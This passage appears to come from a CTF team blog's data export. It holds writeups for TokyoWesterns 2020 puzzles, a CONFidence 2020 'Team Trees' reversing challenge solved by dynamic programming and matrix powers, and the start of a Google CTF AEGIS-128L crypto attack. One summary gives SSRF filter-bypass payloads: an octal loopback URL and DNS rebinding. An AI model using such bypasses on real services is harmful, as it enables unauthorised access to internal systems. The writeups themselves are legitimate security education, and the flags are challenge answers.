and came across to Pollard's algorithm (From An Efficient Solution of the Congruence x2 + ky2 = m (mod n) by Pollard and Schnorr). Moreover, the algorithm is described very clearly in An Exposition of Pollard's Algorithm for Quadratic Congruences by Shallit. I have an implementation of Pollard's algorithm following their procedures.\nSupplying $k$, $m$ and $n$ to Pollard's algorithm, we can get $x$ and $y$ rather quickly. Submitting the values to the verify endpoint would give us the flag - TWCTF{dbodfs-dbqsjdpso-mjcsb-mfp}.\nBirds (Misc, 41 points) Solved by cire meat pop and Mystiz.\nNothing much is given from the challenge description, there are a multiple lines /^[A-Z]{2}[0-9]{3,4}$/'s.\nBC552 AC849 JL106 PQ448 JL901 LH908 NH2177 After a bit of Googling, those are flight numbers. What do they mean? Let's see where they depart and arrive:\n   Flight Depart from Arrive to     BC552 OKA NGO   AC849 LHR YYZ   JL106 ITM HND   PQ448 TBS ODS   JL901 HND OKA   LH908 FRA LHR   NH2177 NRT ITM    Hmm... We can see some locations shown more than once. There must be some meaning. Let's connect them.\nNRT -\u0026gt; ITM -\u0026gt; HND -\u0026gt; OKA -\u0026gt; NGO FRA -\u0026gt; LHR -\u0026gt; YYZ TBS -\u0026gt; ODS By taking the first letter from each of them, we get:\nNIHON FLY TO Oh and finally we have the flag: TWCTF{FLYTONIHON}. Unfortunately the finals is online this year... (And we are not qualified, too)\nAddendum: We did!\nmask (Misc, 26 points) Solved by harrier and cire meat pop.\nThere is a list of IP addresses and maybe subnet mask in the challenge description.\n192.168.55.86/255.255.255.0 192.168.80.198/255.255.255.128 192.168.1.228/255.255.255.128 192.168.90.68/255.255.254.0 192.168.8.214/255.255.255.128 ... The list is quite long, we suspect that each IP address is representing a character. After multiple unsuccessful attempts, we found the host identifier for the last row is 0b111101, which is = in ASCII... Is it encoded with base64?\nimport base64 with open(\u0026#39;mask.txt\u0026#39;) as f: s = f.read().split(\u0026#39;\\n\u0026#39;) a = \u0026#39;\u0026#39; for i in s: lr = i.split(\u0026#39;/\u0026#39;) l = lr[0].split(\u0026#39;.\u0026#39;) r = lr[1].split(\u0026#39;.\u0026#39;) a+=chr(int(l[3])\u0026amp;(255^int(r[3]))) print(base64.b64decode(a)) The output is: TWCTF{Are-you-using-a-mask?}\n","permalink":"https://b6a.black/posts/2020-09-23-twctf/","summary":"urlcheck v1 (Web, 98 points) Solved by Ozetta.\nObjective: SSRF http://127.0.0.1/admin-status The input needs to fulfil the pattern '\\A(\\d+)\\.(\\d+)\\.(\\d+)\\.(\\d+)\\Z' and the first octet cannot be 0 or 127, and some other patterns for internal IP addresses. For some reason, int(\u0026quot;0177\u0026quot;) is still 177 instead of 127 in Python, so we can use http://0177.0.0.1/admin-status\nurlcheck v2 (Web, 128 points) Solved by Ozetta.\nObjective: SSRF http://localhost/admin-status Standard TOCTOU bug, just use DNS rebinding to get access: http://23bbd91c.","title":"TokyoWesterns CTF 6th 2020 Writeup"},{"content":"This week, we have teamed up as @blackb6a to play CONFidence 2020 CTF. We end up ranked 15, but we are more proud of ourselves able to solve a reversing challenge called Team Trees (395 points, 5 solves).\nIn particular, we are the first-to-solve to the challenge. It took us around two hours to win the flag. This writeup is written by @harrier_lcc and @mystiz613.\nChallenge Summary  We wanted to plant a lot of trees, but it's going kinda slow...\n We are given a binary that executes a slow algorithm that takes up a lot of memory. The objective is to wait the program until it is done - the flag would be shown as the output.\n  Never. Our PCs don't even have enough memory to play with that. Even so, we gotta wait forever for the flag. Our objective is to optimize and rewrite the algorithm used. By optimize we mean reduce both the time and space complexities.\nSolution Part I: Baby steps from baby cases From the binary, we knew that we are going to find $f(1337)$ for a given $f$. Although we do not know what $f$ is, we could still have an insight on it. For example, we can patch 1337 by smaller values: 0, 1, etc.:\nn = 0: p4{32b9b6bca55548ed88ec405c5c7cf3a1} n = 1: p4{ee5fadd5a727857f32b9b6bca55548ed} n = 2: p4{ee5fadd5a727857f982d2435efffdac7} n = 3: p4{c8b5922a9f156985b4f8094372145c13} ... n = 4: Out of memory ;_; In particular, 32b9b6bca55548ed in the output for $n = 0$ is the v1 in sub_400816:\nvoid __noreturn sub_400816() { unsigned __int64 v0; // rdx  signed __int64 v1; // rcx  signed __int64 v2; // rt0  v0 = 0x82F96AC97429A68BLL; v1 = 0x32B9B6BCA55548EDLL; __debugbreak(); while ( 1 ) { v2 = v1; v1 = 3 * v0 + 2 * v1 + 4; v0 = v2; } } But what is 88ec405c5c7cf3a1? It must be related to v0 and v1. We tried 3*v0 + 2*v1 + 4 and it is ee5fadd5a727857f. It does not check out.\nWe have spot out that the output shares the same prefix when $n=1$ and $n=2$. Maybe we shall see what is going on with sub_400816 - it is simply generating numbers for a sequence, namely $s_n$, indefinitely:\n $s_0 = \\text{82F96AC97429A68B}_{16}$, $s_1 = \\text{32B9B6BCA55548ED}_{16}$, and $s_k = 3 s_{k-2} + 2 s_{k-1} + 4\\mod2^{64}$ for $k \\geq 2$.  Let's generate a bunch of $a_k$'s to see if there is something interesting:\ns_2 = 0xee5fadd5a727857f s_3 = 0x74ec7fe13e4ee5c9 s_4 = 0xb4f8094372145c13 s_5 = 0xc8b5922a9f156985 ... If we rewrite the program output in terms of $s_k$, we have:\nn = 0: p4{s_1 88ec405c5c7cf3a1} n = 1: p4{s_2 32b9b6bca55548ed} n = 2: p4{s_2 982d2435efffdac7} n = 3: p4{s_5 s_4} The output when $n = 3$ is actually composed by two elements in the sequence. It makes us think: is it the case that 88ec... (also 32b9... and 982d...) is an intermediate state? To verify our thoughts, we are going to dig deeper into the assembly operations.\n  There are four operations. Here are the values of v0 and v1 (as defined in sub_400816) after each of the steps.\n/* rcx = c0, rdx = d0 */ lea rdx, [rdx+rdx*2] /* rcx = c0, rdx = 3*d0 */ lea rdx, [rdx+rcx*2+4] /* rcx = c0, rdx = 3*d0 + 2*c0 + 4 */ xchg rcx, rdx /* rcx = 3*d0 + 2*c0 + 4, rdx = c0 */ jmp short loc_40082F /* rcx = 3*d0 + 2*c0 + 4, rdx = c0 */ With that said, it takes four instructions for a complete cycle inside while. From the smaller values of $n$, we can see that the output format would be p4{[rdx][rcx]}. Let's see some starting values of rcx and rdx:\n step | rdx | rcx ------+------------------+------------------ 0 | 32b9b6bca55548ed | 82f96ac97429a68b 1 | 32b9b6bca55548ed | 88ec405c5c7cf3a1 \u0026lt;- output when n=0 2 | 32b9b6bca55548ed | ee5fadd5a727857f 3 | ee5fadd5a727857f | 32b9b6bca55548ed \u0026lt;- output when n=1 4 | ee5fadd5a727857f | 32b9b6bca55548ed ...or this? 5 | ee5fadd5a727857f | 982d2435efffdac7 \u0026lt;- output when n=2 6 | ee5fadd5a727857f | 74ec7fe13e4ee5c9 7 | 74ec7fe13e4ee5c9 | ee5fadd5a727857f 8 | 74ec7fe13e4ee5c9 | ee5fadd5a727857f 9 | 74ec7fe13e4ee5c9 | cb1f0980f576907d 10 | 74ec7fe13e4ee5c9 | b4f8094372145c13 11 | b4f8094372145c13 | 74ec7fe13e4ee5c9 12 | b4f8094372145c13 | 74ec7fe13e4ee5c9 13 | b4f8094372145c13 | 5ec57fa3baecb15b 14 | b4f8094372145c13 | c8b5922a9f156985 15 | c8b5922a9f156985 | b4f8094372145c13 \u0026lt;- output when n=3 16 | c8b5922a9f156985 | b4f8094372145c13 ...or this? 17 | c8b5922a9f156985 | 1ee81bca563d1439 18 | c8b5922a9f156985 | b053401f9467e747 19 | b053401f9467e747 | c8b5922a9f156985 :bulb: Imagination: You have opened a process with gdb that has a breakpoint at the beginning of the function. You are given a set of something (defined in sub_40090D) and checks if it has a given attribute (defined in sub_4009C4). If so, you call ni to move to the next step. Finally, you print the registers, extract edx and ecx, and print them as the flag.  So... what is the set of something? And what is the attribute it is checked against?\nPart II: Collecting the pieces for the puzzle There are four functions that worth investigating: sub_40090D (the enumerator), sub_4009C4 (the checker), sub_400A59 (the constructor) and sub_400840 (called from sub_40090D). We will first look into sub_400840:\n_DWORD *__fastcall sub_400840(_DWORD *a1) { int i; // [rsp+14h] [rbp-Ch]  _DWORD *v3; // [rsp+18h] [rbp-8h]  v3 = malloc(0x20uLL); if ( !v3 ) { puts(\u0026#34;Out of memory ;_;\u0026#34;); abort(); } *v3 = *a1; for ( i = 0; *a1 \u0026gt; i; ++i ) *(_QWORD *)\u0026amp;v3[2 * i + 2] = sub_400840(*(_QWORD *)\u0026amp;a1[2 * i + 2]); return v3; } Since it is allocating 32 bytes, we can define a dummy struct:\nstruct Dummy { char x[32]; }; Loading the struct into IDA, by redefining the types of a1 and v3 as Dummy*, we have:\nDummy *__fastcall sub_400840(Dummy *src) { int i; // [rsp+14h] [rbp-Ch]  Dummy *dest; // [rsp+18h] [rbp-8h]  dest = (Dummy *)malloc(0x20uLL); if ( !dest ) { puts(\u0026#34;Out of memory ;_;\u0026#34;); abort(); } *(_DWORD *)dest-\u0026gt;x = *(_DWORD *)src-\u0026gt;x; for ( i = 0; *(_DWORD *)src-\u0026gt;x \u0026gt; i; ++i ) *(_QWORD *)\u0026amp;dest-\u0026gt;x[8 * i + 8] = sub_400840(*(Dummy **)\u0026amp;src-\u0026gt;x[8 * i + 8]); return dest; } It is calling itself recursively. Would it be a deep clone? Moreover, we can further see that the first four bytes should be size and it would not be greater than 3. Otherwise 8*i+8 \u0026gt;= 32, overflowing the struct. After all, we think it is a node of the tree - and this is the final struct we have:\nstruct Node { int size; char x[4]; // unknown  Node *child[3]; }; More importantly, we can finally claim that sub_400840 is fully reversed.\nNode *__fastcall clone(Node *src) { int i; // [rsp+14h] [rbp-Ch]  Node *dest; // [rsp+18h] [rbp-8h]  dest = (Node *)malloc(0x20uLL); if ( !dest ) { puts(\u0026#34;Out of memory ;_;\u0026#34;); abort(); } dest-\u0026gt;size = src-\u0026gt;size; for ( i = 0; src-\u0026gt;size \u0026gt; i; ++i ) dest-\u0026gt;child[i] = clone(src-\u0026gt;child[i]); return dest; } Then we will be reversing sub_400A59. This function is simple, it is defining a path with length $n$. After the tree is constructed, it will be used by sub_400BED for enumeration. How? Let's see a baby example when $n = 2$:\ndigraph { t0_0[shape=point] t0_1[shape=point] t0_2[shape=point] t0_0 -\u0026gt; t0_1 [arrowhead=false] t0_1 -\u0026gt; t0_2 [arrowhead=false] x0[shape=point,style=invis] y0[shape=point,style=invis] x0-\u0026gt;y0 t1_0[shape=point] t1_1[shape=point] t1_2[shape=point] t1_3[shape=point] t1_0 -\u0026gt; t1_1 [arrowhead=false] t1_1 -\u0026gt; t1_2 [arrowhead=false] t1_1 -\u0026gt; t1_3 [arrowhead=false] x1[shape=point,style=invis] y1[shape=point,style=invis] x1-\u0026gt;y1 t2_0[shape=point] t2_1[shape=point] t2_2[shape=point] t2_3[shape=point] t2_4[shape=point] t2_0 -\u0026gt; t2_1 [arrowhead=false] t2_1 -\u0026gt; t2_2 [arrowhead=false] t2_1 -\u0026gt; t2_3 [arrowhead=false] t2_1 -\u0026gt; t2_4 [arrowhead=false] x2[shape=point,style=invis] y2[shape=point,style=invis] x2-\u0026gt;y2 t3_0[shape=point] t3_1[shape=point] t3_2[shape=point] t3_3[shape=point] t3_4[shape=point] t3_0 -\u0026gt; t3_1 [arrowhead=false] t3_0 -\u0026gt; t3_3 [arrowhead=false] t3_1 -\u0026gt; t3_2 [arrowhead=false] t3_3 -\u0026gt; t3_4 [arrowhead=false] x3[shape=point,style=invis] y3[shape=point,style=invis] x3-\u0026gt;y3 t4_0[shape=point] t4_1[shape=point] t4_2[shape=point] t4_3[shape=point] t4_4[shape=point] t4_5[shape=point] t4_0 -\u0026gt; t4_1 [arrowhead=false] t4_0 -\u0026gt; t4_3 [arrowhead=false] t4_1 -\u0026gt; t4_2 [arrowhead=false] t4_3 -\u0026gt; t4_4 [arrowhead=false] t4_3 -\u0026gt; t4_5 [arrowhead=false] x4[shape=point,style=invis] y4[shape=point,style=invis] x4-\u0026gt;y4 u[label=\u0026#34;...\u0026#34;, shape=plaintext] x5[shape=point,style=invis] y5[shape=point,style=invis] x5-\u0026gt;y5 t5_0[shape=point] t5_1[shape=point] t5_2[shape=point] t5_3[shape=point] t5_4[shape=point] t5_5[shape=point] t5_6[shape=point] t5_7[shape=point] t5_8[shape=point] t5_9[shape=point] t5_10[shape=point] t5_11[shape=point] t5_12[shape=point] t5_0 -\u0026gt; t5_1 [arrowhead=false] t5_0 -\u0026gt; t5_2 [arrowhead=false] t5_0 -\u0026gt; t5_3 [arrowhead=false] t5_1 -\u0026gt; t5_4 [arrowhead=false] t5_1 -\u0026gt; t5_5 [arrowhead=false] t5_1 -\u0026gt; t5_6 [arrowhead=false] t5_2 -\u0026gt; t5_7 [arrowhead=false] t5_2 -\u0026gt; t5_8 [arrowhead=false] t5_2 -\u0026gt; t5_9 [arrowhead=false] t5_3 -\u0026gt; t5_10 [arrowhead=false] t5_3 -\u0026gt; t5_11 [arrowhead=false] t5_3 -\u0026gt; t5_12 [arrowhead=false] {rank=same; t0_1; u; x0; y0; x1; y1; x2; y2; x3; y3; x4; y4; x5; y5} } Well... it is just enumerating all the ternary trees with depth $n$, where each of the leaf node is on level $n$.\nAfter that, we check the number of good trees. By good it is defined by (former) sub_4009C4:\nsigned __int64 __fastcall is_good_tree(Node *node, int k) { int ka; // [rsp+4h] [rbp-1Ch]  int kb; // [rsp+4h] [rbp-1Ch]  int i; // [rsp+1Ch] [rbp-4h]  ka = k; if ( node-\u0026gt;size \u0026gt; 1 \u0026amp;\u0026amp; k ) return 0LL; if ( node-\u0026gt;size \u0026gt; k ) ka = node-\u0026gt;size; kb = ka - 1; if ( kb \u0026lt; 0 ) kb = 0; for ( i = 0; node-\u0026gt;size \u0026gt; i; ++i ) { if ( (unsigned __int8)is_good_tree(node-\u0026gt;child[i], kb) != 1 ) return 0LL; } return 1LL; } harrier has implemented a good tree checker (himself) in Discord for me to test with:\n  After all, a tree is said to be good if both of the condition are satisfied:\n for each node with two children, every children should have at most one children, and for each node with three children, every children and their grandchildren should have at most one children.  Cool. We have the pieces of the puzzle gathered. Define $g(n)$ to be the number of good trees of depth $n$. We are going to find $g(1337)$ and move the sequence forward by $g(1337)$ instructions.\nPart III: Verifying this for the baby cases We are double checking if our observation checks out for smaller $n$'s. From above, $g(0) = 1$, $g(1) = 3\\ \\text{or}\\ 4$, $g(2) = 5$ and $g(3) = 15\\ \\text{or}\\ 16$.\nFor $n = 0$, the only tree would be:\ndigraph { node[shape=point] edge[arrowhead=false] t0 } Yeah. It is a good tree. Thus $g(0) = 1$. Also, $g(1) = 3$ since the three trees are all good:\ndigraph { node[shape=point] edge[arrowhead=false] t0_0 -\u0026gt; t0_1 t1_0 -\u0026gt; t1_1 t1_0 -\u0026gt; t1_2 t2_0 -\u0026gt; t2_1 t2_0 -\u0026gt; t2_2 t2_0 -\u0026gt; t2_3 } For $n = 2$, we start rejecting trees. There are 39 trees, but there are only five being good. Hence $g(2) = 5$.\ndigraph { node[shape=point] edge[arrowhead=false] t0_0 -\u0026gt; t0_1 t0_1 -\u0026gt; t0_2 t3_0 -\u0026gt; t3_1 t3_1 -\u0026gt; t3_2 t3_1 -\u0026gt; t3_3 t4_0 -\u0026gt; t4_1 t4_1 -\u0026gt; t4_2 t4_1 -\u0026gt; t4_3 t4_1 -\u0026gt; t4_4 t1_0 -\u0026gt; t1_1 t1_0 -\u0026gt; t1_2 t1_1 -\u0026gt; t1_3 t1_2 -\u0026gt; t1_4 t2_0 -\u0026gt; t2_1 t2_0 -\u0026gt; t2_2 t2_0 -\u0026gt; t2_3 t2_1 -\u0026gt; t2_4 t2_2 -\u0026gt; t2_5 t2_3 -\u0026gt; t2_6 } And $g(3) = 15$. They are:\ndigraph { node[shape=point] edge[arrowhead=false] t0_0 -\u0026gt; t0_1 t0_1 -\u0026gt; t0_2 t0_2 -\u0026gt; t0_3 t5_0 -\u0026gt; t5_1 t5_1 -\u0026gt; t5_2 t5_2 -\u0026gt; t5_3 t5_2 -\u0026gt; t5_4 t6_0 -\u0026gt; t6_1 t6_1 -\u0026gt; t6_2 t6_2 -\u0026gt; t6_3 t6_2 -\u0026gt; t6_4 t6_2 -\u0026gt; t6_5 t3_0 -\u0026gt; t3_1 t3_1 -\u0026gt; t3_2 t3_1 -\u0026gt; t3_3 t3_2 -\u0026gt; t3_4 t3_3 -\u0026gt; t3_5 t4_0 -\u0026gt; t4_1 t4_1 -\u0026gt; t4_2 t4_1 -\u0026gt; t4_3 t4_1 -\u0026gt; t4_4 t4_2 -\u0026gt; t4_5 t4_3 -\u0026gt; t4_6 t4_4 -\u0026gt; t4_7 t1_0 -\u0026gt; t1_1 t1_0 -\u0026gt; t1_2 t1_1 -\u0026gt; t1_3 t1_2 -\u0026gt; t1_4 t1_3 -\u0026gt; t1_5 t1_4 -\u0026gt; t1_6 t7_0 -\u0026gt; t7_1 t7_0 -\u0026gt; t7_2 t7_1 -\u0026gt; t7_3 t7_2 -\u0026gt; t7_4 t7_3 -\u0026gt; t7_5 t7_4 -\u0026gt; t7_6 t7_4 -\u0026gt; t7_7 t8_0 -\u0026gt; t8_1 t8_0 -\u0026gt; t8_2 t8_1 -\u0026gt; t8_3 t8_2 -\u0026gt; t8_4 t8_3 -\u0026gt; t8_5 t8_4 -\u0026gt; t8_6 t8_4 -\u0026gt; t8_7 t8_4 -\u0026gt; t8_8 t9_0 -\u0026gt; t9_1 t9_0 -\u0026gt; t9_2 t9_1 -\u0026gt; t9_3 t9_2 -\u0026gt; t9_4 t9_3 -\u0026gt; t9_5 t9_3 -\u0026gt; t9_6 t9_4 -\u0026gt; t9_7 }digraph { node[shape=point] edge[arrowhead=false] t10_0 -\u0026gt; t10_1 t10_0 -\u0026gt; t10_2 t10_1 -\u0026gt; t10_3 t10_2 -\u0026gt; t10_4 t10_3 -\u0026gt; t10_5 t10_3 -\u0026gt; t10_6 t10_4 -\u0026gt; t10_7 t10_4 -\u0026gt; t10_8 t11_0 -\u0026gt; t11_1 t11_0 -\u0026gt; t11_2 t11_1 -\u0026gt; t11_3 t11_2 -\u0026gt; t11_4 t11_3 -\u0026gt; t11_5 t11_3 -\u0026gt; t11_6 t11_4 -\u0026gt; t11_7 t11_4 -\u0026gt; t11_8 t11_4 -\u0026gt; t11_9 t12_0 -\u0026gt; t12_1 t12_0 -\u0026gt; t12_2 t12_1 -\u0026gt; t12_3 t12_2 -\u0026gt; t12_4 t12_3 -\u0026gt; t12_5 t12_3 -\u0026gt; t12_6 t12_3 -\u0026gt; t12_7 t12_4 -\u0026gt; t12_8 t13_0 -\u0026gt; t13_1 t13_0 -\u0026gt; t13_2 t13_1 -\u0026gt; t13_3 t13_2 -\u0026gt; t13_4 t13_3 -\u0026gt; t13_5 t13_3 -\u0026gt; t13_6 t13_3 -\u0026gt; t13_7 t13_4 -\u0026gt; t13_8 t13_4 -\u0026gt; t13_9 t14_0 -\u0026gt; t14_1 t14_0 -\u0026gt; t14_2 t14_1 -\u0026gt; t14_3 t14_2 -\u0026gt; t14_4 t14_3 -\u0026gt; t14_5 t14_3 -\u0026gt; t14_6 t14_3 -\u0026gt; t14_7 t14_4 -\u0026gt; t14_8 t14_4 -\u0026gt; t14_9 t14_4 -\u0026gt; t14_10 t2_0 -\u0026gt; t2_1 t2_0 -\u0026gt; t2_2 t2_0 -\u0026gt; t2_3 t2_1 -\u0026gt; t2_4 t2_2 -\u0026gt; t2_5 t2_3 -\u0026gt; t2_6 t2_4 -\u0026gt; t2_7 t2_5 -\u0026gt; t2_8 t2_6 -\u0026gt; t2_9 } Cool! Everything checks out! Luckily the memory overflows when $n = 4$, otherwise our OCD would be forcing us to find $g(4)$ and the writeup will be flooded by a large forest.\nPart IV: Algorithms, algorithms everywhere In this part, harrier and I work on a different topic:\n harrier's task: Find $g(1337)$. Mystiz's task: Find the flag if harrier has $g(1337)$ computed.  4.1. What is $g(1337)$? To find the number of good trees of height $h$, we define an auxiliary variable $k$ (interpret it as cooldown). Here we redefine good trees again:\nFor a ternary tree, it is said to be good if for every node,\n [Recovery] if $k \u0026gt; 0$: there should be at most one child, and [Fertility] if $k = 0$: if there are $c$ children, then each of them has cooldown $k = c-1$.  Simply put, you need to recover to be fertile. For instance, the following is a good tree since each of the node with non-zero cooldown has only a child.\ndigraph { node[shape=rectangle, style=rounded] t0 [label=0] t1 [label=1] t2 [label=1] t3 [label=0] t4 [label=0] t0-\u0026gt;t1 t0-\u0026gt;t2 t1-\u0026gt;t3 t2-\u0026gt;t4 } However, this is not a good tree since the red node is too fertile:\ndigraph { node[shape=rectangle, style=rounded] t0 [label=0] t1 [label=1, style=\u0026#34;filled, rounded\u0026#34;, fillcolor=\u0026#34;#ff000080\u0026#34;] t2 [label=1] t3 [label=0] t4 [label=0] t5 [label=0] t0-\u0026gt;t1 t0-\u0026gt;t2 t1-\u0026gt;t3 t1-\u0026gt;t4 t2-\u0026gt;t5 } Luckily, we don't need to count the good trees one by one. It can be solved by dynamic programming rather easily. Let's define the state dp[h][k] to be the number of good trees if the tree is of depth h and cooldown k. Then:\n [Base case] dp[0][k] == 1 for every k, [Transition] dp[h][k] == dp[h-1][k-1] for h, k \u0026gt; 0, and [Transition] dp[h][0] == dp[h-1][0] + dp[h-1][1]**2 + dp[h-1][2]**3 for h \u0026gt; 0.  The first condition is obvious - the only tree with depth 0 is the tree with the only root node. It is good no matter what the cooldown is.\nFor the second condition, it is not difficult to imagine it as an tree that must cooldown. Hence, if $\\text{GT}_{hk}$ is a good tree with height $h\u0026gt;0$ and cooldown $k\u0026gt;0$, then:\ndigraph { node[shape=point] edge[arrowhead=false] x-\u0026gt;st subgraph cluster { style=filled color=lightgray label=\u0026#34;GTₕ₋₁,ₖ₋₁\u0026#34; labelloc=b st[shape=triangle, height=2, label=\u0026#34;\u0026#34;] } } It is a little bit tricky for the third condition. Since it is in the fertile mode again, we can decide if there are one, two or three children. Then each of the following trees work:\ndigraph { node[shape=point] edge[arrowhead=false] x0-\u0026gt;st0 subgraph cluster0 { style=filled color=lightgray label=\u0026#34;GTₕ₋₁,₀\u0026#34; labelloc=b st0[shape=triangle, height=2, label=\u0026#34;\u0026#34;] } x1-\u0026gt;st1:n x1-\u0026gt;st2:n subgraph cluster1 { style=filled color=lightgray label=\u0026#34;Each subtree is GTₕ₋₁,₁\u0026#34; labelloc=b st1[shape=triangle, height=2, label=\u0026#34;\u0026#34;] st2[shape=triangle, height=2, label=\u0026#34;\u0026#34;] } x2-\u0026gt;st3:n x2-\u0026gt;st4:n x2-\u0026gt;st5:n subgraph cluster2 { style=filled color=lightgray label=\u0026#34;Each subtree is GTₕ₋₁,₂\u0026#34; labelloc=b st3[shape=triangle, height=2, label=\u0026#34;\u0026#34;] st4[shape=triangle, height=2, label=\u0026#34;\u0026#34;] st5[shape=triangle, height=2, label=\u0026#34;\u0026#34;] } } Hence, if there are k children, then there are dp[h-1][k-1]**k choices. Since we are able to pick k = 1, 2, 3, we can simply sum them up for dp[h][k]. After all, this is the Python script to compute:\ndef g(k: int) -\u0026gt; int: # Base case dp = [[1, 1, 1]] # Transition for _ in range(k): dp.append([ sum([dp[-1][i]**(i+1) for i in range(3)]), dp[-1][0], dp[-1][1] ]) return dp[-1][0] But the numbers is growing exponentially and finding $g(1337)$ takes eternally. What can we do? Nevermind, we will get back to this shortly.\n4.2. Fast sequence generation To compute the values of ecx and edx, we can find the number of executed instructions (denote it as $q$). Since the loop is completed every four steps, we can find $s_{\\mathbf{floor}(q/4)}$ and $s_{\\mathbf{floor}(q/4)+1}$ and perform the remainder of the instructions.\nLet's get back to the sequence $s_n$:\n $s_0 = \\text{82F96AC97429A68B}_{16}$, $s_1 = \\text{32B9B6BCA55548ED}_{16}$, and $s_k = 3 s_{k-2} + 2 s_{k-1} + 4\\mod2^{64}$ for $k \\geq 2$.  To compute it efficiently, we can rewrite it as a matrix notation:\n\\[ \\begin{bmatrix} s_{k+1} \\\\ s_k \\\\ 1 \\end{bmatrix} = \\begin{bmatrix} 2 \u0026 3 \u0026 4 \\\\ 1 \u0026 0 \u0026 0 \\\\ 0 \u0026 0 \u0026 1\\end{bmatrix} \\begin{bmatrix} s_k \\\\ s_{k-1} \\\\ 1 \\end{bmatrix} \\mod 2^{64}. \\]\nWhy? Try the multiplication by yourselves! Anyway, then we are able to compute $s_m$ and $s_{m+1}$ efficiently, since\n\\[ \\begin{bmatrix} s_{m+1} \\\\ s_m \\\\ 1 \\end{bmatrix} = \\begin{bmatrix} 2 \u0026 3 \u0026 4 \\\\ 1 \u0026 0 \u0026 0 \\\\ 0 \u0026 0 \u0026 1\\end{bmatrix}^m \\begin{bmatrix} s_1 \\\\ s_0 \\\\ 1 \\end{bmatrix} \\mod 2^{64}. \\]\nMoreover, since\n\\[\\begin{bmatrix} 2 \u0026 3 \u0026 4 \\\\ 1 \u0026 0 \u0026 0 \\\\ 0 \u0026 0 \u0026 1\\end{bmatrix}^{2^{64}} = \\begin{bmatrix} 1 \u0026 0 \u0026 0 \\\\ 0 \u0026 1 \u0026 0 \\\\ 0 \u0026 0 \u0026 1\\end{bmatrix}, \\]\nthe square matrix has order $2^{64}$. That said, we don't need to find the exact value for $g(1337)$. Instead, we can compute $g(1337)\\mod (2^{64}\\times4)$. Hereby we need to multiple the number by four, since there are 4 instructions per loop).\nPart V: The flagggggggggg! After all, we can modify the Python function we had to compute $g(k)\\mod 2^{66}$:\ndef g(k: int) -\u0026gt; int: # Base case dp = [[1, 1, 1]] # Transition for _ in range(k): dp.append([ sum([dp[-1][i]**(i+1) for i in range(3)]) % 2**66, dp[-1][0], dp[-1][1] ]) return dp[-1][0] And g(1337) = 59988074356265869957 pops out at no time. Therefore, we can find $s_{14997018589066467489}$ and $s_{14997018589066467490}$ and proceed one instruction further. We have rdx being 0x62246322232ceabf and rcx being 0xbf1d9826c054007!\nThus p4{62246322232ceabfbf1d9826c054007} would be the flag, right? NO!\nIt was 4:40 am and we were very sleepy. It took us few minutes to figure out that rcx isn't composed of 16 hexchars. The correct flag should be p4{62246322232ceabf0bf1d9826c054007} (note that there is an zero). Yeah, :checkered_flag: - and we are the first to capture this!\n","permalink":"https://b6a.black/posts/2020-09-08-confidencectf-team-trees/","summary":"This week, we have teamed up as @blackb6a to play CONFidence 2020 CTF. We end up ranked 15, but we are more proud of ourselves able to solve a reversing challenge called Team Trees (395 points, 5 solves).\nIn particular, we are the first-to-solve to the challenge. It took us around two hours to win the flag. This writeup is written by @harrier_lcc and @mystiz613.\nChallenge Summary  We wanted to plant a lot of trees, but it's going kinda slow.","title":"CONFidence 2020 CTF: Team Trees"},{"content":"I was teamed-up with @blackb6a on Google CTF this time. I have solved 7 challenges alone and 3 challenges with my teammates.\nIn particular, Oracle is a crypto challenge with 13 solves. It has got me spending 12 hours. All in all, it was a great experience in terms of learning, but my liver hurts. This piece of writeup may be very computation intensive, just because I would like to make everything clear.\nChallenge Summary There are two parts of the challenges. In the first part, we are required to recover an internal state for AEGIS-128L given the encryption oracle. For the second part, we are required to forge a ciphertext given an error oracle from decryption.\nSolution Part I: A brief summary for the state in AEGIS-128L AEGIS-128L has an internal state that is initially computed solely by the key and the IV. It is of 128 bytes, broken into eight 16-byte blocks. Let's $S_i$ is updated to $S_{i+1}$ given 32-byte payload $M$. Let's define $S_i = (s_{i, 0}, s_{i, 1}, ..., s_{i, 7})$ and $M = (m_0, m_1)$. We have:\n $s_{i+1, 0} \\leftarrow \\text{AESEnc}(s_{i, 7}, s_{i, 0}) \\oplus m_0$, $s_{i+1, 4} \\leftarrow \\text{AESEnc}(s_{i, 3}, s_{i, 4}) \\oplus m_1$, and $s_{i+1, j} \\leftarrow \\text{AESEnc}(s_{i, j-1}, s_{i, j})$ for $j = 1, 2, 3, 5, 6, 7$.  But what is AESEnc? Let's see the implementation.\ndef aes_enc(s: block, t: block) -\u0026gt; block: \u0026#34;\u0026#34;\u0026#34;Performs the AESENC operation with tables.\u0026#34;\u0026#34;\u0026#34; t0 = (te0[s[0]] ^ te1[s[5]] ^ te2[s[10]] ^ te3[s[15]]) t1 = (te0[s[4]] ^ te1[s[9]] ^ te2[s[14]] ^ te3[s[3]]) t2 = (te0[s[8]] ^ te1[s[13]] ^ te2[s[2]] ^ te3[s[7]]) t3 = (te0[s[12]] ^ te1[s[1]] ^ te2[s[6]] ^ te3[s[11]]) s = _block_from_ints([t0, t1, t2, t3]) return _xor(s, t) Well... we will go through this later. Let's introduce how keystreams are generated from the state. It is (relatively) simple. The keystream $(k_{i, 0}, k_{i, 1})$ for the $i$-th round is given by:\n\\[ k_{i, 0} = (s_{i, 2} \\wedge s_{i, 3}) \\oplus s_{i, 1} \\oplus s_{i, 6}, \\\\ k_{i, 1} = (s_{i, 6} \\wedge s_{i, 7}) \\oplus s_{i, 5} \\oplus s_{i, 2}. \\]\nPart II: Recovering part of the state Now we are given that key and IV are unchanged. This implies that the initial state, i.e., $s_{00}, s_{01}, ..., s_{09}$ are constants too.\nSuppose that we have two 96-byte messages $M^{(1)}$ and $M^{(2)}$ with only the first two blocks are different (Formally, if $M^{(k)} := (m^{(k)}_{00}, m^{(k)}_{01}, ..., m^{(k)}_{21}$), then $m^{(1)}_{ij} = m^{(2)}_{ij}$ if and only if $i \\neq 0$).\nThe following table summarizes which of the $s_{ij}$'s that would be different (marked by an !), when encrypting $M^{(1)}$ and $M^{(2)}$ respectively.\n   $i$ \\ $j$ 0 1 2 3 4 5 6 7     0           1 !    !      2 ! !   ! !      What does this imply? Knowing that $s^{(1)}_{2,j} = s^{(2)}_{2,j}$ for $j = 2, 3, 6, 7$. Let's look closely on the last 32 bytes of the keystream:\n\\[ \\begin{aligned} k^{(1)}_{20} \\oplus k^{(2)}_{20} \u0026= m^{(1)}_{20} \\oplus c^{(1)}_{20} \\oplus m^{(2)}_{20} \\oplus c^{(2)}_{20} \\\\ \u0026= \\left[ (s^{(1)}_{22} 